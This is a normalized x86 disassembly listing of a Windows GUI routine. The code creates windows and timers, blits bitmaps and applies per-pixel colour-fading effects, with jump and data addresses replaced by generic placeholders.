mov esi [ esp + 0x140 ]
cmp esi 0x1401
push edi
ja r-xdata
lea eax [ esi - 0x1402 ]
cmp eax 0x4
ja r-xdata
je r-xdata
mov eax [ esp + 0x14c ]
push eax
push ebx
push esi
push ebp
call [ DefWindowProcA@IAT ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn 0x10
jmp [ eax * 4 + jump_table_4204c8 ]
mov al [ rw-data ]
test al al
jne r-xdata
cmp esi 0x18
ja r-xdata
mov ecx [ esp + 0x140 ]
push 0x0
push ecx
call [ ShowWindow@IAT ]
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn 0x10
mov edx [ esp + 0x140 ]
push edx
call [ DestroyWindow@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn 0x10
mov [ rw-data ] 0x1
mov al [ rw-data ]
xor edi edi
test al al
jne r-xdata
call [ GetTickCount@IAT ]
sub eax [ rw-data ]
add eax 0x10
mov edi eax
cmp edi 0xb4
jbe r-xdata
cmp esi 0x113
jne r-xdata
je r-xdata
lea eax [ esp + 0x94 ]
push eax
mov [ rw-data ] 0x0
call [ GetCursorPos@IAT ]
mov ecx [ ebx ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ esp + 0x6c ] ecx
mov ecx [ ebx + 0xc ]
push r--data
mov [ esp + 0x74 ] edx
mov [ esp + 0x78 ] eax
mov [ esp + 0x7c ] ecx
xor bl bl
call [ LoadLibraryA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
mov eax [ rw-data ]
push edi
push 0x96000
lea ecx [ eax + 0x12c000 ]
push eax
add eax 0x96000
push eax
push ecx
mov [ esp + 0x28 ] ecx
call sub_41edc0
add esp 0x14
push ebp
call [ GetDC@IAT ]
mov esi eax
xor bl bl
cmp edi 0xb4
mov [ esp + 0x44 ] esi
jne r-xdata
mov edi 0xb4
jmp r-xdata
cmp ebx 0x1
jne r-xdata
mov eax esi
dec eax
je r-xdata
mov esi [ GetSystemMetrics@IAT ]
push edi
mov [ esp + 0x88 ] edi
mov [ esp + 0x8c ] edi
call esi
push 0x1
mov [ esp + 0x90 ] eax
call esi
mov [ esp + 0x90 ] eax
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x88 ]
push ecx
push edi
push edi
call sub_41ef10
push r--data
push esi
call [ GetProcAddress@IAT ]
cmp eax edi
je r-xdata
mov eax [ rw-data ]
push 0xcc0020
push 0x0
push 0x0
push eax
push 0x12c
push 0x200
push 0x0
push 0x0
push esi
call [ BitBlt@IAT ]
push 0x1
push ebp
call [ KillTimer@IAT ]
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
mov [ rw-data ] 0x1
call [ LeaveCriticalSection@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
push 0x0
push 0x0
push 0x1401
push ebp
call [ SendMessageA@IAT ]
jmp r-xdata
call [ GetTickCount@IAT ]
push 0x0
push 0x14
push ebx
push ebp
mov [ rw-data ] eax
call [ SetTimer@IAT ]
jmp r-xdata
push rw-data
call [ InitializeCriticalSection@IAT ]
mov ecx [ esp + 0x14c ]
mov esi [ ecx + 0x4 ]
mov edi [ CreateWindowExA@IAT ]
xor ebx ebx
push ebx
push esi
push 0x64
push ebp
push 0x18
push 0xf0
push 0xa
push 0x104
push 0x50000001
push r--data
push r--data
push ebx
mov [ rw-data ] bl
call edi
push ebx
push esi
push 0x65
push ebp
push 0x18
push 0xdc
push 0x32
push 0x118
push 0x50000001
push r--data
push r--data
push ebx
call edi
push ebx
push esi
push 0x66
push ebp
push 0x18
push 0xdc
push 0x55
push 0x118
push 0x50000001
push r--data
push r--data
push ebx
call edi
push ebx
push esi
push 0x67
push ebp
push 0x18
push 0xdc
push 0x78
push 0x118
push 0x50000001
push r--data
push r--data
push ebx
call edi
push ebx
push esi
push 0x68
push ebp
push 0x18
push 0xdc
push 0x9b
push 0x118
push 0x50000001
push r--data
push r--data
push ebx
call edi
push ebx
push esi
push 0x69
push ebp
push 0x64
push 0x104
push 0xbe
push 0xf0
push 0x50200004
push r--data
push r--data
push ebx
call edi
lea edx [ esp + 0x44 ]
push edx
push ebx
push ebp
push sub_41f050
push ebx
push ebx
mov [ rw-data ] bl
mov [ rw-data ] bl
call [ CreateThread@IAT ]
push 0xffffffff
push eax
mov [ rw-data ] eax
call [ SetThreadPriority@IAT ]
push ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ CreateCompatibleDC@IAT ]
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
dec eax
jne r-xdata
lea ecx [ esp + 0x48 ]
push ecx
lea edx [ esp + 0x130 ]
push edx
lea ecx [ esp + 0x3c ]
call sub_41eb80
mov ecx eax
mov ebp [ ecx ]
mov edi [ ecx + 0x4 ]
mov edx [ ecx + 0x8 ]
mov ecx [ ecx + 0xc ]
mov [ esp + 0x8c ] edx
mov edx [ eax + 0x4 ]
mov [ esp + 0x90 ] ecx
mov ecx [ eax ]
mov [ esp + 0x5c ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x64 ] eax
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x5c ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
mov edx [ esp + 0x64 ]
mov [ eax + 0xc ] edx
lea eax [ esp + 0x10c ]
push eax
lea ecx [ esp + 0x5c ]
call sub_41ecb0
mov ecx [ eax + 0x8 ]
mov edx [ eax + 0xc ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
mov eax [ esp + 0x8c ]
mov [ esp + 0xe4 ] ecx
sub esp 0x10
mov [ esp + 0xf8 ] edx
mov edx [ esp + 0x58 ]
mov ecx esp
mov [ ecx ] edx
mov [ ecx + 0x4 ] edi
mov [ esp + 0x70 ] eax
mov eax [ esp + 0x60 ]
mov [ ecx + 0x8 ] eax
mov eax [ esp + 0xa0 ]
mov [ ecx + 0xc ] eax
lea ecx [ esp + 0x12c ]
push ecx
lea ecx [ esp + 0x5c ]
mov [ esp + 0xf0 ] esi
mov [ esp + 0xf4 ] ebx
mov [ esp + 0x6c ] ebp
call sub_41ecb0
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x58 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ esp + 0x5c ] ecx
lea ecx [ esp + 0x58 ]
mov [ esp + 0x60 ] edx
push ecx
lea edx [ esp + 0xf0 ]
push edx
lea ecx [ esp + 0xe4 ]
mov [ esp + 0x6c ] eax
call sub_41eb80
mov edx [ eax ]
sub esp 0x10
mov ecx esp
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
mov [ ecx + 0x8 ] edx
mov [ ecx + 0xc ] eax
lea ecx [ esp + 0x11c ]
push ecx
lea ecx [ esp + 0x6c ]
call sub_41ecb0
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x58 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
push 0x0
mov [ esp + 0x60 ] ecx
mov [ esp + 0x64 ] edx
mov [ esp + 0x68 ] eax
call [ GetDC@IAT ]
mov cl [ rw-data ]
test cl cl
mov [ esp + 0x10 ] eax
push 0xcc0020
je r-xdata
lea eax [ esp + 0x48 ]
push eax
push ebp
call [ GetWindowRect@IAT ]
push esi
call [ FreeLibrary@IAT ]
test bl bl
jne r-xdata
lea edx [ esp + 0x6c ]
push edx
push sub_41ef10
push edi
push edi
mov bl 0x1
call eax
mov esi [ esp + 0x144 ]
mov ebx [ esp + 0x148 ]
push rw-data
call [ EnterCriticalSection@IAT ]
push rw-data
mov [ rw-data ] 0x0
call [ LeaveCriticalSection@IAT ]
test bl bl
jne r-xdata
mov ecx rw-data
call sub_41eb60
test al al
je r-xdata
push ebp
call [ DestroyWindow@IAT ]
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x12c
retn 0x10
push ebx
push ebx
xor eax eax
push rw-data
mov ecx 0xb
lea edi [ esp + 0xa8 ]
[ edi ]
push ebx
lea eax [ esp + 0xac ]
push eax
push ebx
mov [ esp + 0xb4 ] 0x28
mov [ esp + 0xb8 ] 0x200
mov [ esp + 0xbc ] 0x384
mov [ esp + 0xc4 ] ebx
mov [ esp + 0xc0 ] 0x1
mov [ esp + 0xc2 ] 0x20
call [ CreateDIBSection@IAT ]
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
push 0x1
push ebp
call [ KillTimer@IAT ]
mov eax [ rw-data ]
push 0xffffffff
push eax
mov [ rw-data ] 0x1
call [ WaitForSingleObject@IAT ]
mov eax [ rw-data ]
xor edi edi
cmp eax edi
je r-xdata
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x70 ]
push ecx
push edx
push eax
push 0x12c
push 0x200
push 0x258
push 0x0
mov eax [ esp + 0xec ]
sub eax ebx
xor ecx ecx
test eax eax
setle cl
xor edx edx
dec ecx
and ecx eax
mov eax [ esp + 0xe8 ]
sub eax esi
test eax eax
setle dl
dec edx
and eax edx
mov edx ebx
sub edx [ esp + 0x50 ]
add edx 0x258
push edx
mov edx esi
sub edx [ esp + 0x50 ]
push edx
mov edx [ rw-data ]
push edx
push ecx
push eax
mov eax [ esp + 0x28 ]
push ebx
push esi
push eax
call [ BitBlt@IAT ]
mov esi [ esp + 0x5c ]
mov eax [ esp + 0x64 ]
mov ecx [ esp + 0x58 ]
sub eax esi
xor edx edx
test eax eax
setle dl
xor ebx ebx
push 0xcc0020
dec edx
and edx eax
mov eax [ esp + 0x64 ]
sub eax ecx
test eax eax
setle bl
dec ebx
and eax ebx
mov ebx esi
sub ebx [ esp + 0x50 ]
add ebx 0x258
push ebx
mov ebx ecx
sub ebx [ esp + 0x50 ]
push ebx
mov ebx [ rw-data ]
push ebx
push edx
push eax
push esi
push ecx
mov ecx [ esp + 0x30 ]
push ecx
call [ BitBlt@IAT ]
mov ebx [ esp + 0x4c ]
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
mov edx [ esp + 0x48 ]
sub eax ebx
mov ebx [ esp + 0x3c ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x40 ]
sub ebx ecx
mov esi ecx
sub eax [ esp + 0x38 ]
mov [ esp + 0x14 ] eax
mov eax ebx
sub esi edx
neg eax
cmp esi eax
jge r-xdata
mov eax [ esp + 0x70 ]
mov edx [ esp + 0x6c ]
mov ecx [ esp + 0x74 ]
mov [ esp + 0x38 ] eax
mov al [ rw-data ]
test al al
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x78 ]
mov [ esp + 0x3c ] ecx
mov [ esp + 0x40 ] edx
mov [ esp + 0x54 ] edi
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] edi
mov [ esp + 0x48 ] edi
je r-xdata
push esi
push ebp
call [ ReleaseDC@IAT ]
jmp r-xdata
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_444100
mov edi eax
call sub_40af00
push eax
push 0x0
mov ecx rw-data
call sub_4440b0
mov ecx [ rw-data ]
add ecx 0x310
mov [ esp + 0x28 ] eax
mov esi eax
call sub_41f020
test eax eax
jle r-xdata
mov ecx [ rw-data ]
push eax
push ecx
call [ SelectObject@IAT ]
mov edi [ rw-data ]
mov eax 0xdfdfdfdf
mov ecx 0x25800
add edi 0x96000
[ edi ]
call [ GetTickCount@IAT ]
push ebx
push 0x14
push 0x1
push ebp
mov [ rw-data ] eax
call [ SetTimer@IAT ]
jmp r-xdata
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call [ CloseHandle@IAT ]
mov [ rw-data ] edi
mov eax [ esp + 0x70 ]
mov edx [ esp + 0x78 ]
mov ecx [ esp + 0x6c ]
push 0x50
sub edx eax
push edx
mov edx [ esp + 0x7c ]
sub edx ecx
push edx
push eax
push ecx
push 0xffffffff
push edi
call [ SetWindowPos@IAT ]
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
push 0x0
push 0x1401
push edi
call esi
cmp esi ebx
jle r-xdata
mov esi eax
mov eax esi
mov ecx edi
imul eax eax 0x104
imul ecx ecx 0xc8
cmp eax ecx
jle r-xdata
mov ecx [ rw-data ]
add ecx 0x310
call sub_41f020
mov esi eax
mov eax [ rw-data ]
cmp eax edi
je r-xdata
push eax
call [ DeleteDC@IAT ]
push 0x5
push edi
call [ ShowWindow@IAT ]
mov esi [ esp + 0x14c ]
cmp [ esi + 0x210 ] 0x10
jb r-xdata
push 0x0
push 0x0
push 0x1401
push edi
call esi
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
neg eax
cmp ecx eax
jge r-xdata
mov esi ebx
cdq
idiv edi
mov ebp 0x104
mov ebx eax
mov eax ecx
cdq
idiv esi
mov ebx 0xc8
mov ebp eax
jmp r-xdata
mov ecx rw-data
call sub_43d760
push rw-data
mov [ rw-data ] edi
call [ DeleteCriticalSection@IAT ]
mov [ rw-data ] edi
jmp r-xdata
push eax
call [ DeleteObject@IAT ]
lea eax [ esi + 0x1fc ]
mov eax [ esi + 0x1fc ]
jmp r-xdata
mov eax [ esp + 0x14 ]
cmp ecx eax
jle r-xdata
mov ecx eax
mov [ esp + 0x1c ] ecx
mov ecx [ rw-data ]
add ecx 0x310
call sub_41f020
mov ecx [ rw-data ]
add ecx 0x2f4
mov esi eax
call sub_41f020
sub eax esi
mov [ esp + 0x30 ] eax
fild [ esp + 0x30 ]
push ecx
fild [ esp + 0x6c ]
fidiv [ esp + 0x2c ]
fmulp st1
fstp [ esp ]
call sub_452500
add esp 0x4
test eax eax
mov [ esp + 0x80 ] eax
jge r-xdata
mov [ esp + 0x68 ] ebx
mov eax ebp
imul eax [ esp + 0x28 ]
cdq
idiv edi
mov [ esp + 0x7c ] ebp
mov [ esp + 0x1c ] ebx
cmp eax ebx
mov [ esp + 0x68 ] eax
jge r-xdata
lea eax [ esi + 0x170 ]
mov eax [ esi + 0x170 ]
jmp r-xdata
mov ebx [ GetDlgItem@IAT ]
push eax
push 0x64
push edi
call ebx
mov ebp [ SetWindowTextA@IAT ]
push eax
call ebp
cmp [ esi + 0x184 ] 0x10
jb r-xdata
mov eax [ esp + 0x90 ]
sub eax edi
xor ecx ecx
test eax eax
setle cl
push 0xcc0020
dec ecx
and ecx eax
mov eax [ esp + 0x90 ]
mov [ esp + 0x48 ] ecx
sub eax ebp
xor ecx ecx
test eax eax
setle cl
dec ecx
and ecx eax
mov [ esp + 0x24 ] ecx
mov ecx [ esp + 0x50 ]
mov eax edi
sub eax ecx
add eax 0x258
push eax
mov eax [ rw-data ]
mov ecx ebp
sub ecx edx
mov edx [ esp + 0x4c ]
push ecx
mov ecx [ esp + 0x2c ]
push eax
push edx
push ecx
sub edi [ esp + 0x50 ]
add edi 0x258
push edi
sub ebp [ esp + 0x50 ]
push ebp
push eax
call [ BitBlt@IAT ]
xor edi edi
test esi esi
mov ebp ebx
jle r-xdata
mov [ esp + 0x1c ] eax
mov ecx [ esp + 0x1c ]
mov eax 0xc8
sub eax ecx
cdq
sub eax edx
mov edi eax
mov eax 0x104
sub eax ebp
cdq
sub eax edx
mov edx [ esp + 0x14 ]
mov esi eax
sar esi 0x1
sar edi 0x1
mov eax 0x122
sub eax esi
sub eax ebp
add ecx edi
lea ecx [ ecx * 4 + 0x28 ]
shl eax 0xb
add eax ecx
add eax edx
xor ebx ebx
lea edx [ esp + 0x9c ]
mov [ esp + 0x2c ] ecx
mov ecx 0xff
sub eax edx
mov [ esp + 0x30 ] edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x9c ] 0x80
mov [ esp + 0xa0 ] 0x8c
mov [ esp + 0xa4 ] 0xa0
mov [ esp + 0xa8 ] 0xb4
mov [ esp + 0xac ] 0xc8
mov [ esp + 0xb0 ] 0xd2
mov [ esp + 0xb4 ] 0xdc
mov [ esp + 0xb8 ] 0xe6
mov [ esp + 0xbc ] 0xf0
mov [ esp + 0xc0 ] 0xf5
mov [ esp + 0xc4 ] 0xfa
mov [ esp + 0xc8 ] 0xfe
mov [ esp + 0xcc ] ecx
mov [ esp + 0xd0 ] ecx
mov [ esp + 0xd4 ] ecx
mov [ esp + 0xd8 ] ecx
mov [ esp + 0x24 ] ebx
mov [ esp + 0x18 ] eax
jmp r-xdata
mov [ esp + 0x80 ] 0x0
lea eax [ esi + 0x18c ]
mov eax [ esi + 0x18c ]
jmp r-xdata
push eax
push 0x65
push edi
call ebx
push eax
call ebp
cmp [ esi + 0x1a0 ] 0x10
jb r-xdata
jge r-xdata
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x34 ]
push 0xcc0020
push edx
mov edx [ esp + 0x18 ]
sub ebp esi
lea ecx [ eax + ebp ]
mov eax [ esp + 0x1c ]
push ecx
mov ecx [ rw-data ]
push edx
push eax
sub ebx ebp
push ebx
push 0x258
push ebp
push ecx
call [ BitBlt@IAT ]
mov edx [ esp + ebx * 4 + 0x9c ]
lea ecx [ eax + ebx * 4 ]
lea eax [ ebp - 0x14 ]
test eax eax
lea ecx [ esp + ecx + 0x9c ]
jle r-xdata
lea eax [ esi + 0x2c0 ]
mov eax [ esi + 0x2c0 ]
jmp r-xdata
push eax
push 0x66
push edi
call ebx
push eax
call ebp
cmp [ esi + 0x2d4 ] 0x10
jb r-xdata
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x38 ]
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x10 ]
mov ebx [ esp + 0x14 ]
push 0xcc0020
push edx
mov edx [ rw-data ]
push eax
push ecx
push ebx
neg esi
push esi
push 0x258
push 0x0
push edx
mov edi esi
call [ BitBlt@IAT ]
jmp r-xdata
jge r-xdata
push 0xcc0020
mov eax ebx
sub eax ecx
mov ecx [ esp + 0x3c ]
lea edx [ eax + ecx ]
mov ecx [ esp + 0x38 ]
push edx
lea edx [ edi + ecx ]
mov ecx [ esp + 0x18 ]
push edx
mov edx [ rw-data ]
push ecx
sub ebx eax
push ebx
sub ebp edi
push ebp
add eax 0x258
push eax
push edi
push edx
jmp r-xdata
inc ebx
cmp ebx 0xc
mov [ esp + 0x24 ] ebx
jl r-xdata
mov esi eax
lea ebx [ ebx ]
lea eax [ esi + 0x26c ]
mov eax [ esi + 0x26c ]
jmp r-xdata
push eax
push 0x67
push edi
call ebx
push eax
call ebp
cmp [ esi + 0x280 ] 0x10
jb r-xdata
mov ecx [ esp + 0x1c ]
test ecx ecx
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
push 0x0
call [ ReleaseDC@IAT ]
mov al [ rw-data ]
test al al
mov esi [ SendMessageA@IAT ]
mov edi [ esp + 0x140 ]
je r-xdata
mov eax [ esp + 0x38 ]
mov edx [ esp + 0x34 ]
push 0xcc0020
push eax
lea eax [ edi + edx ]
mov edx [ esp + 0x18 ]
push eax
push edx
neg ecx
push ecx
sub ebp edi
push ebp
push 0x258
push edi
jmp r-xdata
call [ BitBlt@IAT ]
mov eax [ esp + 0x18 ]
lea esp [ esp ]
mov eax [ esp + 0x14 ]
mov ebx 0x116
sub ebx esi
mov esi [ esp + 0x1c ]
sub ebx ebp
shl ebx 0xb
lea ecx [ ebx + edi * 4 + 0x78 ]
add ecx eax
add esi 0xffffffec
lea eax [ esp + 0xc8 ]
mov [ esp + 0x20 ] ebx
mov [ esp + 0x10 ] ecx
mov [ esp + 0x94 ] esi
mov [ esp + 0x24 ] eax
mov [ esp + 0x18 ] 0xc
mov eax [ ecx ]
mov ebx eax
and ebx 0xff0000
imul ebx edx
mov ebp eax
and ebp 0xff00
imul ebp edx
and eax 0xff
imul eax edx
and ebx 0xff00ffff
or ebx ebp
and ebx 0xffff00ff
or ebx eax
shr ebx 0x8
mov [ ecx ] ebx
add ecx 0x800
dec esi
jne r-xdata
mov ebx [ esp + 0x24 ]
mov ebp [ esp + 0x7c ]
mov esi [ esp + 0x28 ]
lea eax [ esi + 0x1a8 ]
mov eax [ esi + 0x1a8 ]
jmp r-xdata
push eax
push 0x68
push edi
call ebx
push eax
call ebp
cmp [ esi + 0x1bc ] 0x10
jb r-xdata
mov eax [ rw-data ]
push eax
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x18 ]
add ecx 0x800
sub edx 0x4
dec eax
mov [ esp + 0x10 ] ecx
mov [ esp + 0x24 ] edx
mov [ esp + 0x18 ] eax
jne r-xdata
lea ecx [ ecx ]
push eax
push 0x69
push edi
call ebx
push eax
call ebp
push 0x27
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x69
push edi
call ebx
push eax
call [ SetWindowPos@IAT ]
push rw-data
mov [ rw-data ] 0x1
call [ EnterCriticalSection@IAT ]
push rw-data
mov [ rw-data ] esi
call [ LeaveCriticalSection@IAT ]
mov ebp [ esp + 0x140 ]
test esi esi
mov edx [ esp + 0x24 ]
mov edx [ edx ]
jle r-xdata
mov eax [ esp + 0x2c ]
lea edi [ ebx + eax ]
add edi [ esp + 0x14 ]
mov ebp 0xb
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebp
mov edi edi
mov eax [ ecx ]
mov edi eax
and edi 0xff0000
imul edi edx
mov ebp eax
and ebp 0xff00
imul ebp edx
and eax 0xff
imul eax edx
and edi 0xff00ffff
or edi ebp
and edi 0xffff00ff
or edi eax
shr edi 0x8
mov [ ecx ] edi
add ecx 0x4
dec esi
jne r-xdata
mov esi [ esp + 0x94 ]
mov ecx [ esp + 0x10 ]
mov ecx esi
imul ecx esi
add ecx ebp
mov [ esp + 0x94 ] ecx
fild [ esp + 0x94 ]
fsqrt
call sub_4b64c4
mov ecx [ edi ]
mov eax [ esp + eax * 4 + 0x9c ]
mov edx ecx
and edx 0xff0000
imul edx eax
mov ebx ecx
and ebx 0xff00
imul ebx eax
and ecx 0xff
imul ecx eax
and edx 0xff00ffff
or edx ebx
and edx 0xffff00ff
or edx ecx
shr edx 0x8
mov [ edi ] edx
add edi 0x4
inc esi
cmp esi 0xc
jl r-xdata
mov edi [ esp + 0x10 ]
mov ebp [ esp + 0x18 ]
add edi 0x800
dec ebp
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] ebp
jns r-xdata
xor esi esi
imul ebp ebp
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x30 ]
lea esi [ eax + ecx * 4 + 0x48 ]
add esi [ esp + 0x14 ]
mov ebx 0xb
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] ebx
lea ecx [ ecx ]
mov edx edi
imul edx edi
add edx ebx
mov [ esp + 0x20 ] edx
fild [ esp + 0x20 ]
fsqrt
call sub_4b64c4
mov ecx [ esi ]
mov eax [ esp + eax * 4 + 0x9c ]
mov edx ecx
and edx 0xff0000
imul edx eax
mov ebp ecx
and ebp 0xff00
imul ebp eax
and ecx 0xff
imul ecx eax
and edx 0xff00ffff
or edx ebp
and edx 0xffff00ff
or edx ecx
shr edx 0x8
mov [ esi ] edx
add esi 0x4
dec edi
jns r-xdata
mov esi [ esp + 0x10 ]
mov ebx [ esp + 0x18 ]
add esi 0x800
dec ebx
mov [ esp + 0x10 ] esi
mov [ esp + 0x18 ] ebx
jns r-xdata
mov edi 0xb
imul ebx ebx
mov esi [ esp + 0x28 ]
mov ecx [ esp + 0x2c ]
mov eax [ esp + 0x14 ]
mov edi 0x10e
sub edi esi
shl edi 0xb
add edi ecx
add edi eax
xor ebx ebx
mov [ esp + 0x10 ] edi
mov [ esp + 0x2c ] ebx
mov edi edi
mov eax esi
imul eax esi
add eax ebx
mov [ esp + 0x20 ] eax
fild [ esp + 0x20 ]
fsqrt
call sub_4b64c4
mov ecx [ edi ]
mov eax [ esp + eax * 4 + 0x9c ]
mov edx ecx
and edx 0xff0000
imul edx eax
mov ebp ecx
and ebp 0xff00
imul ebp eax
and ecx 0xff
imul ecx eax
and edx 0xff00ffff
or edx ebp
and edx 0xffff00ff
or edx ecx
shr edx 0x8
mov [ edi ] edx
add edi 0x4
inc esi
cmp esi 0xc
jl r-xdata
mov edi [ esp + 0x10 ]
mov ebx [ esp + 0x2c ]
add edi 0x800
inc ebx
cmp ebx 0xc
mov [ esp + 0x10 ] edi
mov [ esp + 0x2c ] ebx
jl r-xdata
xor esi esi
imul ebx ebx
mov eax [ rw-data ]
mov esi [ esp + 0x44 ]
push 0xcc0020
push 0x0
push 0x0
push eax
push 0x12c
push 0x200
push 0x0
push 0x0
push esi
call [ BitBlt@IAT ]
push 0x0
push 0x0
push 0x0
mov bl 0x1
call sub_40af00
mov ecx [ esp + 0x74 ]
mov edx [ esp + 0x8c ]
push eax
mov eax [ esp + 0x8c ]
push 0x0
push 0x2
push eax
push ecx
mov ecx [ esp + 0x48 ]
push 0x0
push edx
mov edx [ esp + 0x58 ]
push eax
mov eax [ esp + 0x48 ]
push eax
add ecx 0xa
push ecx
add edx 0xa
push edx
push esi
mov ecx rw-data
call sub_4421e0
mov ebp [ esp + 0x140 ]
sub_4204e0
mov eax [ rw-data ]
sub esp 0x30
push ebx
push esi
push edi
mov edi [ esp + 0x40 ]
xor ebx ebx
cmp edi ebx
je r-xdata
cmp eax ebx
je r-xdata
cmp eax ebx
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x30
retn
push ebx
push ebx
push 0x1405
push eax
call [ SendMessageA@IAT ]
cmp [ rw-data ] edi
je r-xdata
cmp [ rw-data ] bl
mov esi [ GetWindowLongA@IAT ]
jne r-xdata
mov ecx [ esp + 0x44 ]
push edi
push ecx
push 0x1402
push eax
call [ SendMessageA@IAT ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x30
retn
mov edx [ rw-data ]
push ebx
push 0xfffffffa
push edx
call esi
push eax
mov eax [ rw-data ]
push ebx
push eax
push ebx
push ebx
push ebx
push ebx
push 0x82000000
push ebx
push r--data
push ebx
call [ CreateWindowExA@IAT ]
cmp eax ebx
mov [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
push 0xfffffffa
push eax
call esi
push 0x7f00
push ebx
mov [ esp + 0x28 ] eax
mov [ esp + 0x3c ] r--data
mov [ esp + 0x18 ] ebx
mov [ esp + 0x14 ] 0x30
mov [ esp + 0x2c ] ebx
mov [ esp + 0x40 ] ebx
call [ LoadCursorA@IAT ]
lea ecx [ esp + 0xc ]
push ecx
mov [ esp + 0x2c ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x1c ] ebx
mov [ esp + 0x20 ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x18 ] sub_41f420
call [ RegisterClassExA@IAT ]
test ax ax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
mov [ rw-data ] 0x1
sub_420600
push esi
push edi
mov esi ecx
call sub_450280
mov ecx [ esp + 0xc ]
mov edi eax
mov eax [ esi + 0x4 ]
cmp eax ecx
je r-xdata
mov ecx esi
call sub_450340
mov eax edi
sub eax 0x3
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
retn 0x8
mov ecx esi
call sub_44fb20
pop edi
pop esi
retn 0x8
dec eax
je r-xdata
mov ecx esi
call sub_44fb30
call sub_4b64c4
pop edi
pop esi
retn 0x8
dec eax
jne r-xdata
mov ecx esi
call sub_44fb40
pop edi
movzx eax al
pop esi
retn 0x8
sub_420660
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
mov [ rw-data ] 0x0
mov edi esi
call [ lstrlenA@IAT ]
mov cl [ esi ]
add eax esi
xor dl dl
test cl cl
je r-xdata
sub eax edi
inc eax
push eax
push edi
push rw-data
call [ lstrcpynA@IAT ]
pop edi
mov eax rw-data
pop esi
retn
mov cl [ esi ]
cmp cl 0x2e
je r-xdata
mov eax esi
cmp dl 0x1
jne r-xdata
cmp cl 0x28
je r-xdata
cmp cl 0x29
je r-xdata
cmp edi esi
jne r-xdata
cmp cl 0x5b
je r-xdata
xor dl dl
lea edi [ esi + 0x1 ]
jmp r-xdata
cmp cl 0x5d
jne r-xdata
mov dl 0x1
cmp cl 0x20
jne r-xdata
xor cl 0x20
add cl 0x5f
cmp cl 0x3b
ja r-xdata
inc esi
add esi 0x2
jmp r-xdata
cmp edi esi
jne r-xdata
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
inc edi
jmp r-xdata
sub_4206f0
sub esp 0x10
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x24 ]
mov [ rw-data ] 0x0
cmp [ edi ] 0x0
mov [ esp + 0x10 ] r--data
mov [ esp + 0x14 ] r--data
mov [ esp + 0x18 ] r--data
mov [ esp + 0x1c ] r--data
je r-xdata
pop edi
pop esi
pop ebp
mov eax rw-data
pop ebx
add esp 0x10
retn
mov ebx [ lstrlenA@IAT ]
cmp ecx eax
jne r-xdata
mov dl [ ecx + edi ]
cmp dl [ esi + ecx ]
jne r-xdata
inc ebp
cmp ebp 0x4
jb r-xdata
mov cl [ eax + edi ]
cmp cl 0x30
jl r-xdata
inc ecx
cmp ecx eax
jl r-xdata
mov esi [ esp + ebp * 4 + 0x10 ]
push esi
call ebx
xor ecx ecx
test eax eax
jle r-xdata
mov al [ edi ]
xor al 0x20
add al 0x5f
cmp al 0x3b
ja r-xdata
cmp cl 0x39
jle r-xdata
inc edi
add edi 0x2
jmp r-xdata
mov cl [ eax + edi ]
cmp cl 0x30
lea edx [ eax + edi ]
jl r-xdata
xor ebp ebp
pop edi
pop esi
pop ebp
mov eax rw-data
pop ebx
add esp 0x10
retn
cmp [ edi ] 0x0
jne r-xdata
add eax edi
test eax eax
je r-xdata
cmp cl 0x39
jg r-xdata
sub eax edx
inc eax
push eax
push edx
push rw-data
